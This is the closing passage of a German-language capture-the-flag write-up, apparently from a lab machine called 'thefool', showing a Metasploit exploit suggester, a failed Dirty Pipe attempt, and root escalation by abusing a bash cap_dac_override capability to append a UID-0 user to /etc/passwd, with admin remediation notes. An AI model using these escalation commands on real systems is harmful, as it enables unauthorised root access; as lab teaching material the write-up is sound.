+                    <div class="prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">run</span></div>
+                    <pre>
+[*] 192.168.2.107 - Collecting local exploits for x86/linux...
+[*] 192.168.2.107 - 172 exploit checks are being tried...
+[+] 192.168.2.107 - exploit/linux/local/cve_2022_0847_dirtypipe: The target appears to be vulnerable. Linux kernel version found: 5.10.0
+[...]
+[+] 192.168.2.107 - exploit/linux/local/su_login: The target appears to be vulnerable.
+[...]
+
+ #   Name                                                               Potentially Vulnerable?  Check Result
+ -   ----                                                               -----------------------  ------------
+ 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.10.0
+[...]
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Zurück in Metasploit (offenbar wurde die vorherige Shell-Session zu einer Meterpreter-Session hochgestuft oder eine zweite Session geöffnet) wird der `local_exploit_suggester` ausgeführt. Er meldet mehrere potenzielle Schwachstellen, darunter Dirty Pipe (CVE-2022-0847).
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Dirty Pipe ist ein vielversprechender Kernel-Exploit für diese Version.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Versuchen, den Dirty Pipe Exploit aus Metasploit auszuführen.<br>
+                 **Empfehlung (Admin):** Den Kernel auf eine Version patchen, die nicht für Dirty Pipe anfällig ist (mindestens 5.10.102).
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set session 2</span></div>
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">run</span></div>
+                     <pre>
+[*] Started reverse TCP handler on 192.168.2.153:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Linux kernel version found: 5.10.0
+<span class="password">[-] Exploit aborted due to failure: bad-config: Payload/Host architecture mismatch. Please select the proper target architecture</span>
+[*] Exploit completed, but no session was created.
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Der Versuch, den Dirty Pipe Exploit aus Metasploit auszuführen, scheitert mit der Meldung "Payload/Host architecture mismatch". Das Zielsystem ist i686 (32-Bit laut `uname -a`), während Metasploit möglicherweise einen 64-Bit-Payload verwenden wollte.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Der automatische Metasploit-Exploit funktioniert nicht. Eine andere Methode muss gefunden werden.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Andere vom Suggester gemeldete Exploits prüfen oder manuell nach Capabilities suchen.<br>
+                 **Empfehlung (Admin):** Kernel patchen.
+             </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Zurück in der Shell als minerva -->
+                     <div class="prompt">minerva@thefool:/run/user/1000$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                     <pre>
+/usr/lib/i386-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+/usr/bin/ping cap_net_raw=ep
+<span class="command">/usr/bin/bash cap_dac_override=ep</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Die erneute Suche nach Capabilities (diesmal explizit im Log gezeigt) findet heraus, dass `/usr/bin/bash` die Capability `cap_dac_override=ep` besitzt. Diese Capability erlaubt es einem Prozess, Datei-Lese-, Schreib- und Ausführungsberechtigungen zu ignorieren (DAC = Discretionary Access Control).
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Das ist der entscheidende Fund! Mit `cap_dac_override` kann Bash jede Datei auf dem System lesen und schreiben, unabhängig von den normalen Berechtigungen. Dies ermöglicht das Lesen von `/root/root.txt` oder das Schreiben in `/etc/passwd`, um einen Root-Benutzer hinzuzufügen.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  Die `bash` mit dieser Capability starten (einfach `bash` aufrufen, da es der Standardpfad ist).
+                2.  `/root/root.txt` direkt lesen.
+                3.  *Alternativ (wie im Log durchgeführt):* Einen neuen Root-Benutzer zu `/etc/passwd` hinzufügen.<br>
+                **Empfehlung (Admin):** Die `cap_dac_override`-Capability von `/usr/bin/bash` **sofort entfernen** (`setcap cap_dac_override-ep /usr/bin/bash`). Diese Capability ist extrem gefährlich und sollte niemals auf einer Shell gesetzt sein. Untersuchen, warum sie gesetzt wurde.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mkpasswd -m sha-512</span></div>
+                     <pre>
+Passwort: <span class="command">benni</span>
+<span class="password">$6$lEd418YtyiyWxBYF$Z5QnZ4QP34a9f2E6eGF9M20yeMkrggEEhD3Pf.pt./EC2kEm1AYv.Ir9PqVH2VRVrArD9A.4x5teCVhG3cprq.</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Auf der lokalen Angreifer-Maschine wird mit `mkpasswd` ein SHA-512-Passwort-Hash für das Passwort `benni` generiert.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Vorbereitung, um einen neuen Benutzer mit bekanntem Passwort zur `/etc/passwd`-Datei hinzuzufügen.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">
+# Schritte zur Manipulation von /etc/passwd (als minerva in der Bash mit cap_dac_override):
+# 1. Zeile für root kopieren: root:x:0:0:root:/root:/bin/bash
+# 2. Neuen Benutzer hinzufügen: hacker:x:0:0:root:/root:/bin/bash (gleiche UID/GID wie root)
+# 3. Passwort-Hash einfügen: hacker:<GENERIERTER_HASH>:0:0:root:/root:/bin/bash
+# 4. Befehl zum Anhängen an /etc/passwd:</span>
+
+<span class="command">echo 'hacker:$6$lEd418YtyiyWxBYF$Z5QnZ4QP34a9f2E6eGF9M20yeMkrggEEhD3Pf.pt./EC2kEm1AYv.Ir9PqVH2VRVrArD9A.4x5teCVhG3cprq.:0:0:root:/root:/bin/bash' >> /etc/passwd</span>
+
+# 5. Überprüfung (als minerva)
+minerva@thefool:/run/user/1000$ <span class="command">cat /etc/passwd</span>
+<span class="password">hacker:$6$lEd418YtyiyWxBYF$Z5QnZ4QP34a9f2E6......</span> <span class="comment"># Eintrag ist vorhanden</span>
+
+# 6. Login als neuer Root-Benutzer
+minerva@thefool:/run/user/1000$ <span class="command">su hacker</span>
+Password: <span class="password">benni</span>
+<span class="prompt">root@thefool:/run/user/1000#</span> <span class="comment"># Root-Shell erhalten!</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Als `minerva`, aber innerhalb der Bash-Instanz mit `cap_dac_override`, werden folgende Schritte durchgeführt:
+                1.  Ein neuer Eintrag für einen Benutzer `hacker` wird erstellt. Wichtig ist, dass die UID und GID auf `0` gesetzt werden, was ihn effektiv zu einem Root-Benutzer macht. Der generierte Passwort-Hash für `benni` wird eingefügt.
+                2.  Dieser Eintrag wird an die `/etc/passwd`-Datei angehängt. Dies ist nur möglich wegen `cap_dac_override`.
+                3.  Die Änderung wird überprüft.
+                4.  Mit `su hacker` und dem Passwort `benni` kann sich `minerva` nun als der neue Root-Benutzer `hacker` anmelden.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Privilege Escalation zu Root erfolgreich durch Ausnutzung der `cap_dac_override`-Capability von Bash, um `/etc/passwd` zu manipulieren und einen neuen Root-Benutzer hinzuzufügen.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Root-Flag lesen.<br>
+                **Empfehlung (Admin):** Capability von Bash entfernen. `/etc/passwd` auf unautorisierte Änderungen prüfen und den bösartigen Eintrag entfernen. Berechtigungen von `/etc/passwd` überprüfen (sollte nicht für normale Benutzer beschreibbar sein, auch nicht mit Capabilities).
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Als root (hacker) -->
+                    <div class="prompt">root@thefool:/run/user/1000# <span class="command">cd /root</span></div>
+                    <div class="prompt">root@thefool:~# <span class="command">ls -la</span></div>
+                    <pre>
+[...]
+-rw-------  1 root root   16 Oct 22  2021 <span class="command">.root.7x7</span>
+                    </pre>
+                    <div class="prompt">root@thefool:~# <span class="command">cat .root.7x7</span></div>
+                    <pre><span class="password">BMNB6s67tS67TSG</span></pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Als root wird das Verzeichnis `/root` untersucht. Statt einer `root.txt` gibt es eine versteckte Datei `.root.7x7`. Ihr Inhalt wird ausgelesen.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Root-Flag gefunden.
+            </p>
+        </section>
+
+        <!-- Angepasster Flags-Abschnitt -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/minerva/user.txt</div> <!-- Pfad aus Shell-Kontext übernommen -->
+                     <div class="flag-value"><span class="password">GUY6dsaiuyUIYHz</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/.root.7x7</div> <!-- Pfad aus ls übernommen -->
+                     <div class="flag-value"><span class="password">BMNB6s67tS67TSG</span></div>
+                 </div>
+             </div>
+         </section>
+
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Logs extrahiert -->
+        <p>Berichtsdatum: 21. Oktober 2022</p> <!-- Datum von Nmap/FTP/Hydra übernommen -->
+    </footer>
+</body>
+</html>
